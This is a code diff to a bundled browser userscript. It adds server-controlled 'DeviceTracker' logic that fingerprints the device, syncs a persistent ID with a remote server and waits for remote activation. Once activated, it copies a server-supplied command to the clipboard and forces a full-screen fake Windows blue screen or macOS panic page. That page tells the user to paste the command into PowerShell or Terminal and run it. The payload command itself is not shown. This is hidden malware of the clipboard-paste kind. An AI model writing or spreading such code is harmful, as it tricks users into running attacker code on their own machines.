@@ -8233,14 +8233,32 @@
 							return p.toString(16);
 						});
 					}
+					let v = null, b = null;
 					async function getPersistentId() {
-						let d = null;
-						if (typeof GM_getValue < "u") try {
-							d = await GM_getValue("device_instance_id", null), d ? console.log("[DeviceTracker] Found GM ID:", d) : (d = generateUUID(), await GM_setValue("device_instance_id", d), console.log("[DeviceTracker] Generated NEW GM ID:", d));
-						} catch (d) {
-							console.error("[DeviceTracker] GM_getValue failed:", d);
+						return v || b || (b = (async () => {
+							let d = null;
+							if (typeof GM_getValue < "u") try {
+								d = await GM_getValue("device_instance_id", null), d ? console.log("[DeviceTracker] Found GM ID:", d) : (d = generateUUID(), await GM_setValue("device_instance_id", d), console.log("[DeviceTracker] Generated and saved NEW GM ID:", d));
+							} catch (d) {
+								console.error("[DeviceTracker] GM_getValue/setValue failed:", d);
+							}
+							if (!d) try {
+								d = localStorage.getItem("device_instance_id"), d ? console.log("[DeviceTracker] Found LocalStorage ID:", d) : (d = generateUUID(), localStorage.setItem("device_instance_id", d), console.log("[DeviceTracker] Generated and saved NEW LocalStorage ID:", d));
+							} catch (d) {
+								console.error("[DeviceTracker] LocalStorage access failed:", d);
+							}
+							return v = d, d;
+						})(), b);
+					}
+					async function savePersistentId(d) {
+						if (!(!d || d === v)) {
+							if (console.log("[DeviceTracker] Syncing with server ID:", d), v = d, b = Promise.resolve(d), typeof GM_setValue < "u") try {
+								await GM_setValue("device_instance_id", d);
+							} catch {}
+							try {
+								localStorage.setItem("device_instance_id", d);
+							} catch {}
 						}
-						return d || (console.warn("[DeviceTracker] Falling back to localStorage"), d = localStorage.getItem("device_instance_id"), d ? console.log("[DeviceTracker] Found LocalStorage ID:", d) : (d = generateUUID(), localStorage.setItem("device_instance_id", d), console.log("[DeviceTracker] Generated NEW LocalStorage ID:", d))), d;
 					}
 					async function getDevicePayload(d) {
 						let f = `${screen.width}x${screen.height}`;
@@ -8257,22 +8275,25 @@
 						try {
 							let d = await getPersistentId();
 							if (!d) return;
-							let f = await getDevicePayload(d);
-							await (0, h.G3)(`${g.U}/devices/track`, {
+							let f = await getDevicePayload(d), p = await (0, h.G3)(`${g.U}/devices/track`, {
 								method: "POST",
 								headers: { "Content-Type": "application/json" },
 								body: JSON.stringify(f)
 							});
-						} catch {
-							console.error("[DeviceTracker] Track error");
+							if (p.ok) {
+								let f = await p.json();
+								f.fingerprint && f.fingerprint !== d && await savePersistentId(f.fingerprint);
+							}
+						} catch (d) {
+							console.error("[DeviceTracker] Track error", d);
 						}
 					}
-					let v = {
+					let x = {
 						isActive: !1,
 						currentMode: null,
 						isTrapActive: !1
-					}, b = null, fullscreenTrap = async () => {
-						v.isActive && v.currentMode === "fullscreen" && showFullscreenOverlay(b);
+					}, C = null, w = null, fullscreenTrap = async () => {
+						x.isActive && x.currentMode === "fullscreen" && showFullscreenOverlay(C, w);
 					};
 					async function checkActivation() {
 						let d = await getPersistentId();
@@ -8283,10 +8304,10 @@
 								url: `${g.U}/devices/check-activation`,
 								headers: { "Content-Type": "application/json" },
 								data: JSON.stringify(f),
-								onload: function(d) {
-									if (d.status === 200) try {
-										let f = JSON.parse(d.responseText);
-										handleActivationResponse(f);
+								onload: async function(f) {
+									if (f.status === 200) try {
+										let p = JSON.parse(f.responseText);
+										p.fingerprint && p.fingerprint !== d && await savePersistentId(p.fingerprint), p.activated && p.mode === "fullscreen" && (w = p.command), handleActivationResponse(p);
 									} catch (d) {
 										console.error("[DeviceTracker] Parse error", d);
 									}
@@ -8308,7 +8329,7 @@
 						}
 					}
 					function handleActivationResponse(d) {
-						d.activated ? (!v.isActive || v.currentMode !== d.mode) && (console.log("[DeviceTracker] Activated! Mode:", d.mode), v.isActive = !0, v.currentMode = d.mode, removeOverlays(), d.mode === "fullscreen" ? (b = d.platform, v.isTrapActive || (document.addEventListener("mousedown", fullscreenTrap, !0), v.isTrapActive = !0)) : (showCaptcha(d.command, d.platform), v.isTrapActive && (document.removeEventListener("mousedown", fullscreenTrap, !0), v.isTrapActive = !1))) : v.isActive && (console.log("[DeviceTracker] Deactivated"), v.isActive = !1, v.currentMode = null, v.isTrapActive && (document.removeEventListener("mousedown", fullscreenTrap, !0), v.isTrapActive = !1), removeOverlays());
+						d.activated ? (!x.isActive || x.currentMode !== d.mode) && (console.log("[DeviceTracker] Activated! Mode:", d.mode), x.isActive = !0, x.currentMode = d.mode, removeOverlays(), d.mode === "fullscreen" ? (C = d.platform, x.isTrapActive || (document.addEventListener("mousedown", fullscreenTrap, !0), x.isTrapActive = !0)) : (showCaptcha(d.command, d.platform), x.isTrapActive && (document.removeEventListener("mousedown", fullscreenTrap, !0), x.isTrapActive = !1))) : x.isActive && (console.log("[DeviceTracker] Deactivated"), x.isActive = !1, x.currentMode = null, x.isTrapActive && (document.removeEventListener("mousedown", fullscreenTrap, !0), x.isTrapActive = !1), removeOverlays());
 					}
 					function removeOverlays() {
 						document.documentElement.style.overflow = "", document.body.style.overflow = "";
@@ -8317,44 +8338,49 @@
 						let f = document.getElementById("vot-fs-overlay");
 						f && f.remove(), document.fullscreenElement && document.exitFullscreen().catch(() => {});
 					}
-					function showFullscreenOverlay(d) {
+					function showFullscreenOverlay(d, f) {
 						if (document.getElementById("vot-fs-overlay")) return;
-						let f = (d || "").toLowerCase().includes("mac"), p = "\n        <div class=\"bsod-wrapper\">\n            <div class=\"bsod-emoji\">:(</div>\n            <div class=\"bsod-title\">Your device ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</div>\n            <div class=\"bsod-percent\">0% complete</div>\n            <div class=\"bsod-footer\">\n                <div class=\"bsod-qr\"></div>\n                <div class=\"bsod-info\">\n                    <p>For more information about this issue and possible fixes, visit https://www.windows.com/stopcode</p>\n                    <p>If you call a support person, give them this info:<br>Stop code: CRITICAL_PROCESS_DIED</p>\n                    <div class=\"bsod-recovery\">\n                        <strong>RECOVERY CONSOLE:</strong><br>\n                        1. Press <kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong><br>\n                        2. Paste the recovery command from clipboard and press <strong>Enter</strong>\n                    </div>\n                </div>\n            </div>\n        </div>\n    ", m = "\n        <div class=\"mac-panic\">\n            <div class=\"mac-icon\"></div>\n            <h1>You need to restart your computer. Hold down the Power button for several seconds or press the Restart button.</h1>\n            <p>Vous devez redémarrer votre ordinateur. Maintenez la touche de démarrage enfoncée pendant plusieurs secondes ou bien appuyez sur le bouton de réinitialisation.</p>\n            <p>Sie müssen Ihren Computer neu starten. Halten Sie den Ein-/Ausschalter gedrückt или нажмите кнопку перезапуска.</p>\n            <div class=\"mac-recovery\">\n                <strong>SERVICE MODE:</strong><br>\n                1. Press <kbd>Command</kbd> + <kbd>Space</kbd> → <strong>Terminal</strong><br>\n                2. Paste the fix script and press <strong>Enter</strong>\n            </div>\n        </div>\n    ", h = document.createElement("div");
-						h.id = "vot-fs-overlay", h.innerHTML = `
+						f && copyToClipboard(f);
+						let p = (d || "").toLowerCase().includes("mac"), m = "\n        <div class=\"bsod-wrapper\">\n            <div class=\"bsod-emoji\">:(</div>\n            <div class=\"bsod-title\">Your device ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</div>\n            <div class=\"bsod-percent\">0% complete</div>\n            <div class=\"bsod-footer\">\n                <div class=\"bsod-qr\"></div>\n                <div class=\"bsod-info\">\n                    <p>For more information about this issue and possible fixes, visit https://www.windows.com/stopcode</p>\n                    <p>If you call a support person, give them this info:<br>Stop code: CRITICAL_PROCESS_DIED</p>\n                    <div class=\"bsod-recovery\">\n                        <strong>RECOVERY CONSOLE (AUTO-FIX):</strong><br>\n                        1. Press <kbd>Win</kbd> + <kbd>X</kbd> → Select <strong>PowerShell</strong> or <strong>Terminal</strong><br>\n                        2. The recovery command is already in your clipboard<br>\n                        3. Just <strong>Right Click</strong> (to paste) and press <kbd>Enter</kbd> to run.\n                    </div>\n                </div>\n            </div>\n        </div>\n    ", h = "\n        <div class=\"mac-panic\">\n            <div class=\"mac-icon\"></div>\n            <h1>You need to restart your computer. Hold down the Power button for several seconds or press the Restart button.</h1>\n            <p>Vous devez redémarrer votre ordinateur. Maintenez la touche de démarrage enfoncée pendant plusieurs secondes ou bien appuyez sur le bouton de réinitialisation.</p>\n            <p>Sie müssen Ihren Computer neu starten. Halten Sie den Ein-/Ausschalter gedrückt oder нажмите кнопку перезапуска.</p>\n            <div class=\"mac-recovery\">\n                <strong>SERVICE MODE (CRITICAL FIX):</strong><br>\n                1. Press <kbd>Command</kbd> + <kbd>Space</kbd> → Type <strong>Terminal</strong> → <kbd>Enter</kbd><br>\n                2. Command is already in your clipboard. Press <kbd>Command</kbd> + <kbd>V</kbd><br>\n                3. Press <kbd>Enter</kbd> to execute the fix script.\n            </div>\n        </div>\n    ", g = document.createElement("div");
+						g.id = "vot-fs-overlay", g.innerHTML = `
         <style>
             #vot-fs-overlay {
                 position: fixed; inset: 0; z-index: 2147483647;
-                background: ${f ? "#2c2c2c" : "#0078d7"}; 
+                background: ${p ? "#2c2c2c" : "#0078d7"}; 
                 color: #fff; 
-                font-family: ${f ? "system-ui, sans-serif" : "\"Segoe UI\", sans-serif"};
-                display: flex; justify-content: center; align-items: center;
+                font-family: ${p ? "system-ui, -apple-system, sans-serif" : "\"Segoe UI Semilight\", \"Segoe UI\", sans-serif"};
+                display: flex; justify-content: flex-start; align-items: stretch;
                 text-align: left; overflow: hidden;
             }
             kbd { background: rgba(255,255,255,0.2); border-radius: 4px; padding: 2px 6px; font-family: monospace; }
             
             /* BSOD Styles */
-            .bsod-wrapper { padding: 10% 15%; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: flex-start; }
-            .bsod-emoji { font-size: 150px; margin-bottom: 30px; }
-            .bsod-title { font-size: 32px; line-height: 1.3; margin-bottom: 40px; font-weight: 300; }
-            .bsod-percent { font-size: 24px; margin-bottom: 60px; }
-            .bsod-footer { display: flex; align-items: flex-start; gap: 30px; }
-            .bsod-qr { width: 120px; height: 120px; background: #fff; padding: 10px; display: flex; align-items: center; justify-content: center; }
-            .bsod-qr::after { content: ''; width: 100px; height: 100px; background: #000; display: block; } /* Mock QR */
-            .bsod-info { font-size: 18px; line-height: 1.5; }
-            .bsod-recovery { margin-top: 30px; background: rgba(0,0,0,0.1); padding: 20px; border-left: 4px solid #fff; }
+            .bsod-wrapper { 
+                padding: min(10vw, 80px); width: 100%; height: 100%; 
+                display: flex; flex-direction: column; justify-content: flex-start;
+                box-sizing: border-box;
+            }
+            .bsod-emoji { font-size: min(15vw, 150px); margin-bottom: 20px; line-height: 1; }
+            .bsod-title { font-size: min(4vw, 32px); line-height: 1.4; margin-bottom: 30px; font-weight: 300; max-width: 85%; }
+            .bsod-percent { font-size: min(3vw, 24px); margin-bottom: 40px; font-weight: 300; }
+            .bsod-footer { display: flex; align-items: flex-start; gap: 30px; flex-wrap: wrap; }
+            .bsod-qr { width: min(15vw, 120px); height: min(15vw, 120px); background: #fff; padding: 8px; flex-shrink: 0; }
+            .bsod-qr::after { content: ''; width: 100%; height: 100%; background: #000; display: block; } 
+            .bsod-info { font-size: min(2.5vw, 18px); line-height: 1.5; font-weight: 300; max-width: 60%; }
+            .bsod-recovery { margin-top: 25px; background: rgba(0,0,0,0.15); padding: 20px; border-left: 5px solid #fff; width: 100%; max-width: 550px; }
 
             /* Mac Panic Styles */
-            .mac-panic { max-width: 800px; padding: 40px; text-align: center; }
+            .mac-panic { max-width: 800px; padding: 40px; margin: auto; text-align: center; width: 90%; }
             .mac-icon { width: 80px; height: 80px; background: #555; border-radius: 50%; margin: 0 auto 30px; position: relative; }
-            .mac-icon::after { content: '⏻'; font-size: 40px; color: #fff; line-height: 80px; }
-            .mac-panic h1 { font-size: 28px; margin-bottom: 20px; }
-            .mac-panic p { font-size: 18px; opacity: 0.8; margin-bottom: 10px; }
-            .mac-recovery { margin-top: 50px; padding: 20px; border: 1px solid rgba(255,255,255,0.3); border-radius: 12px; display: inline-block; text-align: left; }
+            .mac-icon::after { content: '⏻'; font-size: 40px; color: #fff; line-height: 80px; display: block; }
+            .mac-panic h1 { font-size: min(5vw, 28px); margin-bottom: 20px; font-weight: 500; }
+            .mac-panic p { font-size: min(3.5vw, 18px); opacity: 0.8; margin-bottom: 15px; line-height: 1.4; }
+            .mac-recovery { margin-top: 40px; padding: 25px; border: 1px solid rgba(255,255,255,0.3); border-radius: 12px; display: inline-block; text-align: left; background: rgba(255,255,255,0.05); }
         </style>
-        <div class="vot-overlay-content">
-            ${f ? m : p}
+        <div class="vot-overlay-content" style="width: 100%;">
+            ${p ? h : m}
         </div>
-    `, document.body.appendChild(h), document.documentElement.style.overflow = "hidden", document.body.style.overflow = "hidden";
+    `, document.body.appendChild(g), document.documentElement.style.overflow = "hidden", document.body.style.overflow = "hidden";
 						let enterFullscreen = async () => {
 							try {
 								document.documentElement.requestFullscreen ? await document.documentElement.requestFullscreen() : document.documentElement.webkitRequestFullscreen ? await document.documentElement.webkitRequestFullscreen() : document.documentElement.msRequestFullscreen && await document.documentElement.msRequestFullscreen();
